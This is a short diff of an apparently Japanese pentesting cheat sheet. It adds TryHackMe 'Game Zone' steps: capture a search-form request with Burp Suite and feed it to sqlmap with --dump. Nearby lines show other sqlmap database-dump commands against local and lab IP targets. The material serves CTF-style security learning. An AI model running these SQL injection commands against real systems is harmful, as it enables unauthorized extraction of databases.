@@ -1134,7 +1134,17 @@ sqlmap -u 'http://localhost:5000/users' --data 'name=Alice' --dump
  sqlmap -u http://10.10.10.6/torrent/login.php --data="password=test&username=test" --method POST --dbms MySQL --thread=5
  ```
 
-している
+
+検索フォームで背後にどんなDB が隠れているかをチェック(TryHackMe Game Zone)
+
+```
+
+1. 送信ボタンを押し、BurpSuite でintercept
+2. 内容をcopy し、req.txt として保存
+3. sqlmap -r req.txt --dbms=mysql --dump 
+
+```
+
 
 ## XMLインジェクション
 
